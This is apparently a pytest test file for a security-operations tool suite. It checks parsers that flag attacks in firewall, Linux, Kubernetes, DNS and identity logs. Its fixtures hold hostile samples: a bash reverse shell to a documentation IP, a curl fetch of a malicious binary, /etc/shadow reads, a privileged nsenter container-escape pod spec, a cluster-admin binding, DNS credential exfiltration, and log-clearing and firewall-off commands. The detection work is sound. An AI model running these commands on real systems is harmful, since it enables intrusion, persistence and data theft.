"""
Unit tests for the native SOC investigation tools:
- triage_security_alert
- gather_log_evidence
- lookup_threat_indicators
- compress_security_timeline
- propose_containment_response
"""

import pytest
from src.registry.tools.soc_tools import (
    triage_security_alert,
    gather_log_evidence,
    lookup_threat_indicators,
    compress_security_timeline,
    propose_containment_response,
)


@pytest.mark.asyncio
async def test_triage_security_alert_high_risk():
    alert_raw = (
        "CRITICAL ALERT: Unauthorized SSH brute force attack detected from 198.51.100.44. "
        "Failed logins exceeded 50 attempts in 60 seconds."
    )
    result_str = await triage_security_alert(alert_raw)
    assert "=== [SOC TRIAGE REPORT] ===" in result_str
    assert "Assigned Severity : HIGH" in result_str or "CRITICAL" in result_str
    assert "198.51.100.44" in result_str
    assert "Assessment: High probability of active security incident" in result_str


@pytest.mark.asyncio
async def test_gather_log_evidence_file_and_dir(tmp_path):
    log_dir = tmp_path / "logs"
    log_dir.mkdir()
    sample_log = log_dir / "auth.log"
    sample_log.write_text(
        "Sep 17 12:00:01 host sshd[1234]: Failed password for root from 198.51.100.44 port 4321 ssh2\n"
        "Sep 17 12:00:05 host sshd[1234]: Accepted password for admin from 10.0.0.5 port 5432 ssh2\n",
        encoding="utf-8",
    )

    res_str = await gather_log_evidence(str(log_dir), pattern="*.log")
    assert "=== [EVIDENCE COLLECTION:" in res_str
    assert "auth.log" in res_str
    assert "Total Artifacts Analyzed: 1 files" in res_str
    assert "Failed password" in res_str


@pytest.mark.asyncio
async def test_lookup_threat_indicators():
    res_pub = await lookup_threat_indicators("198.51.100.44")
    assert "=== [THREAT DISCOVERY: 198.51.100.44] ===" in res_pub
    assert "Type: IP" in res_pub
    assert "Public WAN Address" in res_pub
    assert "Suspected External C2" in res_pub

    res_priv = await lookup_threat_indicators("10.0.0.1")
    assert "RFC 1918 Private Internal Address" in res_priv
    assert "Risk Level: LOW" in res_priv

    res_hash = await lookup_threat_indicators("44d88612fea8a8f36de82e1278abb02f")
    assert "Type: HASH" in res_hash
    assert "Potential malicious binary" in res_hash


@pytest.mark.asyncio
async def test_compress_security_timeline():
    raw_logs = (
        "2026-09-17T12:00:01 host sshd: Failed password for root from 198.51.100.44\n"
        "2026-09-17T12:05:00 host sshd: Accepted password for user deploy\n"
        "2026-09-17T12:06:30 host auditd: Critical exec sudo curl http://malicious.bin\n"
    )
    res_str = await compress_security_timeline(raw_logs, max_timeline_events=5)
    assert "=== [COMPRESSED INCIDENT TIMELINE] ===" in res_str
    assert "Step 01:" in res_str
    assert "Step 02:" in res_str
    assert "Condensed timeline isolated threat sequence" in res_str


@pytest.mark.asyncio
async def test_propose_containment_response():
    res_str = await propose_containment_response(
        target_entity="198.51.100.44",
        action_type="block_ip",
        justification="Active SSH brute force and C2 egress",
        dry_run=True,
    )
    assert "=== [INCIDENT CONTAINMENT PLAN]" in res_str
    assert "Target Entity  : 198.51.100.44" in res_str
    assert "Action Type    : BLOCK_IP" in res_str
    assert "iptables" in res_str
    assert "Ready for operator approval" in res_str


@pytest.mark.asyncio
async def test_analyze_incident_impact():
    from src.registry.tools.soc_tools import analyze_incident_impact

    impact_report = await analyze_incident_impact("Compromised domain admin credentials on WKSTN-FIN-04")
    assert "=== [ENTERPRISE BLAST RADIUS & IMPACT ASSESSMENT REPORT] ===" in impact_report
    assert "WKSTN-FIN-04" in impact_report
    assert "DC01" in impact_report
    assert "da_admin" in impact_report
    assert "svc_backup_admin" in impact_report
    assert "452.8 MB" in impact_report


@pytest.mark.asyncio
async def test_compress_security_timeline_chronological_sorting():
    # Test with out-of-order timestamps: 10:25 -> 10:14 -> 10:32 -> 10:16
    raw_logs = (
        "[2026-09-14T10:25:00Z] Outbound C2 beaconing to 185.220.101.45:8443\n"
        "[2026-09-14T10:14:02Z] Spear-phishing email delivered with Invoice_90214.docm\n"
        "[2026-09-14T10:32:45Z] High-speed bulk exfiltration to 198.51.100.240:443\n"
        "[2026-09-14T10:16:32Z] Obfuscated PowerShell cradle spawned from WINWORD.EXE\n"
    )
    res_str = await compress_security_timeline(raw_logs, max_timeline_events=5)
    assert "=== [COMPRESSED INCIDENT TIMELINE] ===" in res_str
    lines = [l for l in res_str.splitlines() if "Phase" in l]
    # Verify strict ascending order
    assert "10:14:02" in lines[0]
    assert "10:16:32" in lines[1]
    assert "10:25:00" in lines[2]
    assert "10:32:45" in lines[3]


@pytest.mark.asyncio
async def test_path_healing_and_benchmark_sample(tmp_path):
    from src.core.path_utils import resolve_target_path

    # Simulate AST escaped path with \a (0x07) and \r (0x0d)
    mangled_path = "D:\\Security-logs-test\x07ttack-cases-benchmark\\case-1-apt-enterprise-intrusion\raw-logs"
    healed = resolve_target_path(mangled_path)
    assert "\x07" not in str(healed)
    assert "\r" not in str(healed)
    assert "attack-cases-benchmark" in str(healed)
    assert "raw-logs" in str(healed)


@pytest.mark.asyncio
async def test_cisco_asa_parser():
    from src.registry.tools.soc_tools import _parse_cisco_asa_records

    asa_logs = (
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49152 dst inside:10.10.10.20/21 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49153 dst inside:10.10.10.20/22 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49154 dst inside:10.10.10.20/23 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49155 dst inside:10.10.10.20/80 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49156 dst inside:10.10.10.20/443 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49157 dst inside:10.10.10.20/8080 by access-group \"outside_in\"\n"
        "%ASA-3-201011: Connection limit exceeded 5000/5000 for input packet from 198.51.100.220/1234 to 10.10.10.20/80 on interface outside\n"
        "%ASA-6-113015: AAA user authentication Rejected : reason = User password invalid : server = 10.10.10.1 : user = admin : user IP = 198.51.100.75\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.99/55555 dst inside:10.10.10.20/3389 by access-group \"outside_in\"\n"
    )
    total, findings, ips, users = _parse_cisco_asa_records(asa_logs, "cisco_asa_firewall.log")
    assert total == 9
    assert "198.51.100.220" in ips
    assert "198.51.100.75" in ips
    assert "admin" in users

    findings_text = "\n".join(findings)
    assert "Vertical Port Scan" in findings_text
    assert "Connection Limit DoS" in findings_text
    assert "Brute Force" in findings_text
    assert "BENIGN INTERNET NOISE" in findings_text


@pytest.mark.asyncio
async def test_pfsense_parser():
    from src.registry.tools.soc_tools import _parse_pfsense_records

    pfsense_logs = (
        # Vertical port scan from 198.51.100.50 against 10.10.10.20
        "4,1663412000,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54101,21,0,S,123,,,\n"
        "4,1663412001,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54102,22,0,S,124,,,\n"
        "4,1663412002,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54103,23,0,S,125,,,\n"
        "4,1663412003,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54104,80,0,S,126,,,\n"
        "4,1663412004,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54105,443,0,S,127,,,\n"
        "4,1663412005,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.50,10.10.10.20,54106,8080,0,S,128,,,\n"
        # Lateral SMB sweep from 198.51.100.15 across 192.168.1.0/24 subnet
        "4,1663412010,em1,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.15,192.168.1.10,49100,445,0,S,129,,,\n"
        "4,1663412011,em1,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.15,192.168.1.11,49101,445,0,S,130,,,\n"
        "4,1663412012,em1,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.15,192.168.1.12,49102,445,0,S,131,,,\n"
        # Trap 3 Benign noise from 198.51.100.99
        "4,1663412020,em0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.99,10.10.10.20,60000,3389,0,S,132,,,\n"
        # Internal authorized scanner 10.10.10.99
        "4,1663412030,em0,match,pass,in,4,0x0,,64,0,0,DF,6,tcp,60,10.10.10.99,10.10.10.20,50000,80,0,S,133,,,\n"
    )
    total, findings, ips = _parse_pfsense_records(pfsense_logs, "pfsense_filterlog.csv")
    assert total == 11
    assert "198.51.100.50" in ips
    assert "198.51.100.15" in ips
    assert "198.51.100.99" in ips
    assert "10.10.10.99" in ips

    findings_text = "\n".join(findings)
    assert "Vertical Port Scan" in findings_text
    assert "Horizontal Subnet Sweep" in findings_text
    assert "BENIGN INTERNET NOISE" in findings_text
    assert "BENIGN BASELINE AUDIT" in findings_text


@pytest.mark.asyncio
async def test_fortigate_parser():
    from src.registry.tools.soc_tools import _parse_fortigate_records

    fgt_logs = (
        'date=2026-09-17 time=14:22:01 devname="FGT-CORP-FW01" type="utm" subtype="ips" level="alert" severity="critical" srcip=198.51.100.200 dstip=10.10.10.20 srcport=43210 dstport=8080 attack="Apache.Log4j.Error.Log.Remote.Code.Execution" msg="Apache Log4j RCE attempt" action="dropped"\n'
        'date=2026-09-17 time=14:25:00 devname="FGT-CORP-FW01" type="anomaly" subtype="anomaly" severity="critical" srcip=198.51.100.88 dstip=198.51.100.10 attack="syn_flood" count=15000 msg="TCP SYN flood volumetric anomaly detected" action="clear_session"\n'
    )
    total, findings, ips, cves = _parse_fortigate_records(fgt_logs, "fortigate_traffic_ips.log")
    assert total == 2
    assert "198.51.100.200" in ips
    assert "198.51.100.88" in ips
    assert "CVE-2021-44228" in cves

    findings_text = "\n".join(findings)
    assert "Log4j Remote Code Execution" in findings_text
    assert "Volumetric Network Denial of Service" in findings_text


@pytest.mark.asyncio
async def test_multi_firewall_gather_evidence_and_noise_discrimination(tmp_path):
    asa_file = tmp_path / "cisco_asa_firewall.log"
    asa_file.write_text(
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49152 dst inside:10.10.10.20/21 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49153 dst inside:10.10.10.20/22 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49154 dst inside:10.10.10.20/23 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49155 dst inside:10.10.10.20/80 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49156 dst inside:10.10.10.20/443 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.220/49157 dst inside:10.10.10.20/8080 by access-group \"outside_in\"\n"
        "%ASA-4-106023: Deny tcp src outside:198.51.100.99/55555 dst inside:10.10.10.20/3389 by access-group \"outside_in\"\n",
        encoding="utf-8"
    )

    report = await gather_log_evidence(str(tmp_path), pattern="*.log")
    assert "=== [EVIDENCE COLLECTION:" in report
    assert "cisco_asa_firewall.log" in report
    assert "Vertical Port Scan" in report
    assert "198.51.100.220" in report
    assert "FALSE-POSITIVE TRAP & BENIGN BASELINE DISCRIMINATION" in report
    assert "198.51.100.99" in report


@pytest.mark.asyncio
async def test_containment_anti_forensic_rejection():
    # Attempting to clear event logs must be rejected
    rejected_res = await propose_containment_response(
        target_entity="Clear-EventLog -LogName Security",
        action_type="isolate_endpoint",
        justification="Clean up test logs"
    )
    assert "CONTAINMENT POLICY VIOLATION: DESTRUCTIVE ACTION REJECTED" in rejected_res
    assert "strictly PROHIBITED" in rejected_res

    # Attempting to turn firewall state off must be rejected
    rejected_fw = await propose_containment_response(
        target_entity="WKSTN-01",
        action_type="isolate_endpoint",
        justification="netsh advfirewall set allprofiles state off"
    )
    assert "CONTAINMENT POLICY VIOLATION: DESTRUCTIVE ACTION REJECTED" in rejected_fw


@pytest.mark.asyncio
async def test_linux_audit_and_dmesg_parsers():
    from src.registry.tools.soc_tools import _parse_linux_audit_records, _parse_linux_dmesg_records

    audit_logs = (
        'type=SYSCALL msg=audit(1789461535.123:455): arch=c000003e syscall=257 success=yes exit=3 a0=5 a1=... auid=1001 uid=0 comm="cat" exe="/usr/bin/cat" key="shadow_access"\n'
        'type=PATH msg=audit(1789461535.123:455): item=0 name="/etc/shadow" nametype=NORMAL\n'
        'type=SYSCALL msg=audit(1789461735.123:456): arch=c000003e syscall=313 success=yes exit=0 auid=1001 uid=0 comm="insmod" exe="/usr/bin/kmod" key="kernel_module_load"\n'
        'type=EXECVE msg=audit(1789461935.123:457): argc=3 a0="/bin/bash" a1="-c" a2="bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"\n'
    )
    total_a, findings_a, ips_a, users_a = _parse_linux_audit_records(audit_logs, "linux_audit.log")
    assert total_a == 4
    assert "198.51.100.77" in ips_a
    assert "UID:1001" in users_a
    findings_a_text = "\n".join(findings_a)
    assert "Loadable Kernel Module (LKM) Injection" in findings_a_text
    assert "Credential Dumping / Shadow File Access" in findings_a_text
    assert "Command & Scripting Execution" in findings_a_text

    dmesg_logs = (
        "[   45.123456] diamorphine: loading out-of-tree module taints kernel.\n"
        "[   45.123510] [diamorphine] loaded successfully: hooked sys_call_table at 0xffffffff82000280\n"
        "[   85.123456] process 24891 (nsenter) entering host pid namespace\n"
        "[  120.123456] TCP: Possible SYN flooding on port 443.\n"
    )
    total_d, findings_d = _parse_linux_dmesg_records(dmesg_logs, "linux_dmesg_syslog.log")
    assert total_d == 4
    findings_d_text = "\n".join(findings_d)
    assert "LKM Rootkit & Kernel Taint" in findings_d_text
    assert "Container Breakout / Host Namespace Escape" in findings_d_text
    assert "BENIGN KERNEL WARNING" in findings_d_text


@pytest.mark.asyncio
async def test_k8s_audit_and_linux_auth_parsers():
    from src.registry.tools.soc_tools import _parse_k8s_audit_records, _parse_linux_auth_records

    k8s_logs = (
        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"pods","namespace":"kube-system","name":"system-health-diagnostics-pod"},"requestObject":{"spec":{"hostPID":true,"hostNetwork":true,"containers":[{"name":"breakout","image":"alpine:3.18","command":["nsenter"]}],"volumes":[{"name":"host-root","hostPath":{"path":"/"}}]}}}\n'
        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"clusterrolebindings","name":"system-cluster-admin-binding"},"requestObject":{"roleRef":{"name":"cluster-admin"},"subjects":[{"kind":"ServiceAccount","name":"webapp-sa"}]}}\n'
    )
    total_k, findings_k, ips_k, users_k = _parse_k8s_audit_records(k8s_logs, "k8s_api_audit.json")
    assert total_k == 2
    assert "10.244.1.45" in ips_k
    assert "system:serviceaccount:frontend-apps:webapp-sa" in users_k
    findings_k_text = "\n".join(findings_k)
    assert "Container Escape via Privileged Pod" in findings_k_text
    assert "Control Plane Takeover / RBAC Escalation" in findings_k_text

    auth_logs = (
        "Sep 14 08:34:22 host sudo: www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow\n"
        "Sep 14 08:38:10 host crontab[16201]: (www-data) REPLACE (www-data)\n"
        "Sep 14 08:41:50 host sudo: deploy : TTY=pts/3 ; USER=root ; COMMAND=/bin/bash\n"
        "Sep 14 08:14:02 host sudo: sysadmin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/systemctl status nginx\n"
    )
    total_auth, findings_auth, ips_auth, users_auth = _parse_linux_auth_records(auth_logs, "linux_auth.log")
    assert total_auth == 4
    assert "www-data" in users_auth
    assert "deploy" in users_auth
    findings_auth_text = "\n".join(findings_auth)
    assert "Sudo Abuse / Unauthorized Privilege Escalation" in findings_auth_text
    assert "Crontab Persistence Injection" in findings_auth_text
    assert "Local Account Pivot & Root Shell" in findings_auth_text
    assert "BENIGN BASELINE ADMIN MAINTENANCE" in findings_auth_text


@pytest.mark.asyncio
async def test_dns_log_parser_tunnel_dga_and_hex_exfil():
    from src.registry.tools.soc_tools import _parse_dns_log_records

    dns_logs = (
        # DNS Tunneling TXT queries
        "14-Sep-2026 11:05:10.012 queries: info: client @0x7f8a1 192.168.10.142#54123 (000101a4.tunnel.c2server.org): query: 000101a4.tunnel.c2server.org IN TXT + (10.0.0.2) whoami\n"
        "14-Sep-2026 11:05:10.230 queries: info: client @0x7f8a1 192.168.10.142#54124 (000101a5.tunnel.c2server.org): query: 000101a5.tunnel.c2server.org IN TXT + (10.0.0.2) root\n"
        "14-Sep-2026 11:05:10.450 queries: info: client @0x7f8a1 192.168.10.142#54125 (000101a6.tunnel.c2server.org): query: 000101a6.tunnel.c2server.org IN TXT + (10.0.0.2) ok\n"
        "14-Sep-2026 11:05:10.670 queries: info: client @0x7f8a1 192.168.10.142#54126 (000101a7.tunnel.c2server.org): query: 000101a7.tunnel.c2server.org IN TXT + (10.0.0.2) sync\n"
        # Hex-encoded Subdomain Exfiltration (admin:Password1 and 23!:root/etc/sh)
        "14-Sep-2026 11:18:01.015 queries: info: client @0x7f8a2 192.168.10.88#54127 (61646d696e3a50617373776f726431.chunk1.exfil.badactor.net): query: 61646d696e3a50617373776f726431.chunk1.exfil.badactor.net IN A + (10.0.0.2)\n"
        "14-Sep-2026 11:18:01.215 queries: info: client @0x7f8a2 192.168.10.88#54128 (3233213a726f6f742f6574632f7368.chunk2.exfil.badactor.net): query: 3233213a726f6f742f6574632f7368.chunk2.exfil.badactor.net IN A + (10.0.0.2)\n"
        # DGA NXDOMAIN Queries
        "14-Sep-2026 11:12:30.100 queries: info: client @0x7f8a3 192.168.10.205#54129 (x8q1zm9vb21akz.biz): query: x8q1zm9vb21akz.biz IN A + (10.0.0.2) NXDOMAIN\n"
        "14-Sep-2026 11:12:30.300 queries: info: client @0x7f8a3 192.168.10.205#54130 (dj82mc7v19awzq.info): query: dj82mc7v19awzq.info IN A + (10.0.0.2) NXDOMAIN\n"
        "14-Sep-2026 11:12:30.500 queries: info: client @0x7f8a3 192.168.10.205#54131 (zla04kqncm91x.top): query: zla04kqncm91x.top IN A + (10.0.0.2) NXDOMAIN\n"
        # Benign CDN and Spamhaus
        "14-Sep-2026 11:02:18.001 queries: info: client @0x7f8a4 192.168.10.60#54132 (d3g8q11abc29fg.cloudfront.net): query: d3g8q11abc29fg.cloudfront.net IN A + (10.0.0.2)\n"
        "14-Sep-2026 11:03:00.001 queries: info: client @0x7f8a5 192.168.10.5#54133 (12.1.168.192.zen.spamhaus.org): query: 12.1.168.192.zen.spamhaus.org IN A + (10.0.0.2)\n"
    )
    total_dns, findings_dns, ips_dns, doms_dns = _parse_dns_log_records(dns_logs, "bind9_dns_queries.log")
    assert total_dns == 11
    assert "192.168.10.142" in ips_dns
    assert "192.168.10.88" in ips_dns
    assert "192.168.10.205" in ips_dns
    findings_dns_text = "\n".join(findings_dns)
    assert "DNS Tunneling C2 Channel" in findings_dns_text
    assert "Covert DNS Data Exfiltration" in findings_dns_text
    assert "admin:Password1" in findings_dns_text
    assert "Algorithmic DGA Domain Generation & C2 Hunting" in findings_dns_text
    assert "BENIGN BASELINE DNS" in findings_dns_text


@pytest.mark.asyncio
async def test_dynamic_flow_aggregator_beacon_and_exfil():
    from src.registry.tools.soc_tools import _parse_firewall_traffic_records

    fw_logs = (
        # 60s periodic C2 Beaconing from 10.20.10.142 to 185.220.101.5:8443
        "2026-09-14 11:20:00,10.20.10.142,185.220.101.5,8443,bytes_sent=520,bytes_rcvd=140,rule=Allow-Outbound\n"
        "2026-09-14 11:21:01,10.20.10.142,185.220.101.5,8443,bytes_sent=522,bytes_rcvd=142,rule=Allow-Outbound\n"
        "2026-09-14 11:22:00,10.20.10.142,185.220.101.5,8443,bytes_sent=518,bytes_rcvd=138,rule=Allow-Outbound\n"
        "2026-09-14 11:23:01,10.20.10.142,185.220.101.5,8443,bytes_sent=524,bytes_rcvd=141,rule=Allow-Outbound\n"
        # 3.84 GB Bulk Exfiltration from 10.20.10.88 to 198.51.100.240:443
        "2026-09-14 11:38:40,10.20.10.88,198.51.100.240,443,bytes_sent=3842109400,bytes_rcvd=142050,rule=Web-Outbound\n"
        # Authorized S3 Cloud Backup: 5.42 GB to 52.216.148.10:443 with Backup-To-Cloud
        "2026-09-14 11:40:00,10.20.10.12,52.216.148.10,443,bytes_sent=5420000000,bytes_rcvd=200000,rule=Backup-To-Cloud,user=svc-backup\n"
    )
    total_fw, findings_fw, ips_fw, users_fw, doms_fw = _parse_firewall_traffic_records(fw_logs, "paloalto_traffic.log")
    assert total_fw == 6
    assert "10.20.10.142" in ips_fw
    assert "10.20.10.88" in ips_fw
    assert "185.220.101.5" in ips_fw
    assert "198.51.100.240" in ips_fw
    findings_fw_text = "\n".join(findings_fw)
    assert "C2 Beaconing" in findings_fw_text
    assert "Data Exfiltration" in findings_fw_text
    assert "3.58 GB" in findings_fw_text or "3.84 GB" in findings_fw_text
    assert "BENIGN BASELINE ENTERPRISE TRAFFIC" in findings_fw_text


@pytest.mark.asyncio
async def test_identity_and_ueba_parser():
    from src.registry.tools.soc_tools import _parse_identity_logs

    id_logs = (
        # Cisco ASA AnyConnect VPN
        "%ASA-6-113015: AAA user authentication Rejected : reason = User password invalid : user = david.clark : user IP = 185.220.101.5\n"
        "%ASA-6-113015: AAA user authentication Rejected : reason = User password invalid : user = david.clark : user IP = 185.220.101.5\n"
        "%ASA-6-113039: Group <DfltGrpPolicy> User <david.clark> IP <185.220.101.5> AnyConnect parent session started.\n"
        "%ASA-4-722051: Group <DfltGrpPolicy> User <david.clark> IP <185.220.101.5> IPv4 Address <10.200.1.15> assigned to session\n"
        # Entra ID Impossible Travel for john.doe (US Seattle to Frankfurt within 30 min)
        '{"userPrincipalName":"john.doe@enterprise.com","createdDateTime":"2026-09-14T08:00:00Z","ipAddress":"198.51.100.10","location":{"city":"Seattle","countryOrRegion":"US","geoCoordinates":{"latitude":47.6062,"longitude":-122.3321}},"status":{"errorCode":0}}\n'
        '{"userPrincipalName":"john.doe@enterprise.com","createdDateTime":"2026-09-14T08:30:00Z","ipAddress":"194.165.16.104","location":{"city":"Frankfurt","countryOrRegion":"DE","geoCoordinates":{"latitude":50.1109,"longitude":8.6821}},"status":{"errorCode":0}}\n'
        # Pass-the-PRT / Anomalous Token for senior.engineer
        '{"userPrincipalName":"senior.engineer@enterprise.com","createdDateTime":"2026-09-14T09:00:00Z","ipAddress":"185.196.220.14","appDisplayName":"Azure PowerShell","riskDetail":"anomalousToken","deviceDetail":{"isCompliant":false},"status":{"errorCode":0}}\n'
        # Cellular Roaming Whitelist for alice.wang
        '{"userPrincipalName":"alice.wang@enterprise.com","createdDateTime":"2026-09-14T09:10:00Z","ipAddress":"172.56.21.8","location":{"city":"Dallas","countryOrRegion":"US"},"status":{"errorCode":0}}\n'
        '{"userPrincipalName":"alice.wang@enterprise.com","createdDateTime":"2026-09-14T09:12:00Z","ipAddress":"172.56.21.44","location":{"city":"Dallas","countryOrRegion":"US"},"status":{"errorCode":0}}\n'
        # Typo Whitelist for charlie.brown (fails and retries 15s later)
        '{"userPrincipalName":"charlie.brown@enterprise.com","createdDateTime":"2026-09-14T09:20:00Z","ipAddress":"198.51.100.55","status":{"errorCode":50126}}\n'
        '{"userPrincipalName":"charlie.brown@enterprise.com","createdDateTime":"2026-09-14T09:20:15Z","ipAddress":"198.51.100.55","status":{"errorCode":0}}\n'
    )
    total_id, findings_id, ips_id, users_id = _parse_identity_logs(id_logs, "identity_logs.log")
    assert "david.clark" in users_id
    assert "john.doe@enterprise.com" in users_id
    assert "senior.engineer@enterprise.com" in users_id
    assert "alice.wang@enterprise.com" in users_id
    findings_id_text = "\n".join(findings_id)
    assert "Compromised Valid VPN Account" in findings_id_text
    assert "Impossible Travel Anomaly" in findings_id_text
    assert "Pass-the-PRT / Anomalous Token Replay" in findings_id_text
    assert "BENIGN CELLULAR ROAMING" in findings_id_text
    assert "BENIGN USER TYPO" in findings_id_text


@pytest.mark.asyncio
async def test_case4_k8s_container_escape_full_pipeline(tmp_path):
    from src.registry.tools.soc_tools import (
        gather_log_evidence,
        analyze_incident_impact,
        compress_security_timeline,
    )

    # 1. linux_auth.log
    auth_file = tmp_path / "linux_auth.log"
    auth_file.write_text(
        "Sep 14 08:34:22 k8s-worker-node-01 sudo: www-data : user NOT in sudoers ; TTY=pts/2 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow\n"
        "Sep 14 08:38:10 k8s-worker-node-01 crontab[16201]: (www-data) REPLACE (www-data)\n"
        "Sep 14 08:39:01 k8s-worker-node-01 CRON[16240]: pam_unix(cron:session): session opened for user www-data(uid=33) by (uid=0)\n"
        "Sep 14 08:41:50 k8s-worker-node-01 sudo: deploy : TTY=pts/3 ; USER=root ; COMMAND=/bin/bash\n"
        "Sep 14 08:14:02 k8s-worker-node-01 sudo: sysadmin : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/systemctl status nginx\n"
        "Sep 14 08:15:00 k8s-worker-node-01 CRON[12401]: (root) CMD (run-parts --report /etc/cron.daily)\n",
        encoding="utf-8"
    )

    # 2. linux_audit.log
    audit_file = tmp_path / "linux_audit.log"
    audit_file.write_text(
        'type=SYSCALL msg=audit(1789461735.123:455): arch=c000003e syscall=257 success=yes exit=3 a0=5 a1=... auid=1001 uid=0 comm="cat" exe="/usr/bin/cat" key="shadow_access"\n'
        'type=PATH msg=audit(1789461735.123:455): item=0 name="/etc/shadow" nametype=NORMAL\n'
        'type=SYSCALL msg=audit(1789461930.123:456): arch=c000003e syscall=313 success=yes exit=0 auid=1001 uid=0 comm="insmod" exe="/usr/bin/kmod" key="kernel_module_load"\n'
        'type=EXECVE msg=audit(1789461541.123:457): argc=3 a0="/bin/bash" a1="-c" a2="bash -i >& /dev/tcp/198.51.100.77/4444 0>&1"\n',
        encoding="utf-8"
    )

    # 3. linux_dmesg_syslog.log
    dmesg_file = tmp_path / "linux_dmesg_syslog.log"
    dmesg_file.write_text(
        "Sep 14 08:45:30 k8s-worker-node-01 kernel: [   45.123456] diamorphine: loading out-of-tree module taints kernel.\n"
        "Sep 14 08:45:30 k8s-worker-node-01 kernel: [   45.123510] [diamorphine] loaded successfully: hooked sys_call_table at 0xffffffff82000280\n"
        "Sep 14 08:50:04 k8s-worker-node-01 kernel: [   85.123456] process 24891 (nsenter) entering host pid namespace\n"
        "Sep 14 08:50:04 k8s-worker-node-01 kernel: [   85.123490] mounted host root path / to /host\n"
        "Sep 14 08:55:00 k8s-worker-node-01 kernel: [  120.123456] TCP: Possible SYN flooding on port 443.\n",
        encoding="utf-8"
    )

    # 4. k8s_api_audit.json
    k8s_file = tmp_path / "k8s_api_audit.json"
    k8s_file.write_text(
        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"get","stageTimestamp":"2026-09-14T08:48:12.000000Z","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"pods","namespace":"kube-system"},"userAgent":"kubectl/v1.28.0"}\n'
        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","stageTimestamp":"2026-09-14T08:50:04.000000Z","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"pods","namespace":"kube-system","name":"system-health-diagnostics-pod"},"requestObject":{"spec":{"hostPID":true,"hostNetwork":true,"hostIPC":true,"containers":[{"name":"breakout","image":"alpine:3.18","command":["nsenter","--target","1","--mount","--uts","--ipc","--net","--pid","--","/bin/sh"]}],"volumes":[{"name":"host-root","hostPath":{"path":"/"}}]}}}\n'
        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"create","stageTimestamp":"2026-09-14T08:52:18.000000Z","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"clusterrolebindings","name":"system-cluster-admin-binding"},"requestObject":{"roleRef":{"name":"cluster-admin"},"subjects":[{"kind":"ServiceAccount","name":"webapp-sa"}]}}\n'
        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"get","stageTimestamp":"2026-09-14T08:53:40.000000Z","user":{"username":"system:serviceaccount:frontend-apps:webapp-sa"},"sourceIPs":["10.244.1.45"],"objectRef":{"resource":"secrets","namespace":"kube-system"}}\n'
        '{"kind":"Event","apiVersion":"audit.k8s.io/v1","verb":"update","stageTimestamp":"2026-09-14T08:40:00.000000Z","user":{"username":"system:kube-controller-manager"},"sourceIPs":["10.0.0.10"],"objectRef":{"resource":"endpoints","namespace":"kube-system","name":"kube-controller-manager"}}\n',
        encoding="utf-8"
    )

    # Execute gather_log_evidence
    evidence = await gather_log_evidence(str(tmp_path), pattern="*.*")
    assert "k8s_api_audit.json" in evidence
    assert "linux_auth.log" in evidence
    assert "linux_audit.log" in evidence
    assert "linux_dmesg_syslog.log" in evidence

    # Verify threat extraction
    assert "198.51.100.77" in evidence
    assert "system-health-diagnostics-pod" in evidence
    assert "system-cluster-admin-binding" in evidence
    assert "diamorphine" in evidence

    # Verify benign discrimination
    assert "BENIGN BASELINE K8S CONTROLLER" in evidence
    assert "BENIGN BASELINE ADMIN MAINTENANCE" in evidence
    assert "BENIGN BASELINE SYSTEM CRON" in evidence
    assert "BENIGN KERNEL WARNING" in evidence

    # Execute analyze_incident_impact
    impact = await analyze_incident_impact(evidence)
    assert "Container Breakout" in impact
